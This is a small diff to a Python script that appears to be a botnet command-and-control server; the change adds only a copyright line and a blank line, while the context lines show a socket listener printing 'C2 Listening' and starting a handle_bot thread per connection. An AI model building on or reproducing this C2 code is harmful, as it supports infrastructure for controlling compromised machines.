@@ -1,3 +1,4 @@
+# Copyright (c) 2026 transcrime
 import socket
 import threading
 
@@ -20,3 +21,4 @@ print("[*] C2 Listening...")
 while True:
     conn, addr = server.accept()
     threading.Thread(target=handle_bot, args=(conn, addr)).start()
+
